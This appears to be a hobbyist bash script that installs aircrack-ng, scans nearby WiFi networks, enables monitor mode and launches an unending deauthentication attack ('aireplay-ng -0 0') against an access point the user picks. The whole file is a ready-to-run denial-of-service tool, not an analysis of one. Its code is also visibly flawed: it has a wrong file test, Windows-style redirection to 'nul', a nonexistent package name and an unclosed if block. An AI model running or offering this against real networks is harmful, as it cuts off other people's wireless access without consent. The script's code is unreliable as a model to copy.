#Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks. 
#Dependencies: net-tools, egrep, aircrack-ng

if [ ! -f '/etc/apt' ]
then
echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits."
echo "checking for dependencies.."
if [ ! -f '/usr/local/bin/aircrack-ng' ]
then
echo "loading aircrack.."
sudo apt install aircrack-ng -y > nul
fi
if [ ! -f '/bin/egrep' ]
then
echo "loading egrep.."
sudo apt install egrep -y > nul
fi
if [ ! -f '/sbin/iwlist' ]
then
echo "loading net-tools.."
sudo apt install net-tools -y > nul
fi
echo "dependecie check done.."
echo "."
echo "."
#end of dependencie check
iwconfig
echo "Interface name(e.g. wlan0):"
read inter
clear
echo "scanning networks.."
sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
echo "Choose Channel:"
read chan
echo "pls wait.."
sudo airmon-ng start $inter $chan > nul
echo "MAC of Access-Points:"
read macacc
echo "loading attack..."
sudo aireplay-ng -0 0 -a $macacc -b $macacc $inter\mon
sudo airmon-ng stop $inter\mon > nul
exit 0
